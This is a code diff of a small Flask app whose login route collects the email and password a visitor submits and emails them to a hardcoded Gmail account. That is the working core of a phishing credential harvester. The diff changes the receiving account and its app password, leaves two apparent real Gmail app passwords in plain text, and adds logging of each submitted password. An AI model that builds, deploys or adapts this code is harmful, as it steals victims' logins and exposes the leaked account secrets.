@@ -12,8 +12,8 @@ app.config['SECRET_KEY'] = 'your_secret_key_here'
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 587
 app.config['MAIL_USE_TLS'] = True
-app.config['MAIL_USERNAME'] = 'alexchen1407@gmail.com '  # Your Gmail email address
-app.config['MAIL_PASSWORD'] = 'kjwfwyrjggdnuspg'  # Your Gmail password or App Password
+app.config['MAIL_USERNAME'] = 'festusmbahconnect@gmail.com'  # Your Gmail email address
+app.config['MAIL_PASSWORD'] = 'hntfxouyygziqsso'  # Your Gmail password or App Password
 
 mail = Mail(app)
 
@@ -26,8 +26,12 @@ def login():
     email = request.form.get('email')
     password = request.form.get('password')
 
+    # Log the received form data
+    app.logger.debug(f'Received email: {email}')
+    app.logger.debug(f'Received password: {password}')
+
     if not email or not password:
-        flash('Email and password are required.', 'error')
+        flash('Email and Password are required.', 'error')
         return redirect(url_for('index'))
 
     try:
@@ -37,10 +41,10 @@ def login():
         mail.send(msg)
         flash('Login details sent successfully.', 'success')
     except Exception as e:
+        app.logger.error(f'Failed to send email. Error: {str(e)}')
         flash(f'Failed to send email. Error: {str(e)}', 'error')
 
     return redirect(url_for('index'))
 
 if __name__ == '__main__':
-    # Only run the app if this script is executed directly
     app.run(host='0.0.0.0', port=8080, debug=True)
